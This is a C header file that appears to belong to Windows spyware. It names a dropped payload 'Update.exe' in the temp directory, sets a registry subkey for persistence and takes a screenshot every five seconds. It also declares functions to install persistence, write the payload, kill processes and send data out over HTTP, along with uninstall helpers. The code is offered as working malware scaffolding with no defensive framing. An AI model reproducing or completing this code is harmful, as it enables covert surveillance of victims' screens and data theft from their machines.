#pragma once


///----------------------------------------------------------------------------------------------------------------------------------------
///	Change this to change the name of the payload file written to the temp directory.
///---------------------------------------------------------------------------------------------------------------------------------------- 
#define PAYLOAD_NAME L"Update.exe"


///----------------------------------------------------------------------------------------------------------------------------------------
///	This is the registry path that is used for persistance.
///---------------------------------------------------------------------------------------------------------------------------------------- 
#define REGISTRY_SUBKEY L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\"

///----------------------------------------------------------------------------------------------------------------------------------------
///	This is the cooldown between each screenshot took. It's in milliseconds so 5 secs would be 1000 * 5 or 5000 milliseconds.
///---------------------------------------------------------------------------------------------------------------------------------------- 
#define SS_COOLDOWN 5000

/* ---------------------------------------------------------------------------------------------------------------------------------------- */

#define U_PTR( x ) (UINT_PTR) x
#define C_PTR( x ) (PVOID) x

/* ---------------------------------------------------------------------------------------------------------------------------------------- */

#define REG_ERR( cApiName, ... ) printf("(-) %s FAILED: %lx\n", cApiName)

#define LOG_ERR( cApiName, ... ) printf("(-) %s FAILED: %d\n", cApiName, GetLastError())

/* ---------------------------------------------------------------------------------------------------------------------------------------- */
// installation functions

BOOL ActivatePersistance();

BOOL ReadLocalFile( OUT PVOID* pFileBuff, OUT DWORD* pdwSize );

BOOL WritePayloadToTemp( IN LPCWSTR TempDirectory );

/* ---------------------------------------------------------------------------------------------------------------------------------------- */
// uninstall functions

BOOL DeletePersistanceReg();

BOOL RemovePayloadFromDisk();

/* ---------------------------------------------------------------------------------------------------------------------------------------- */
// helper functions

BOOL TerminateRunningProcess( IN DWORD dwPid );

BOOL CheckProcesses( IN LPCWSTR lpProcessName, OUT DWORD* dwPid );

BOOL SendOverHttp( IN PVOID pAddress, IN DWORD size );
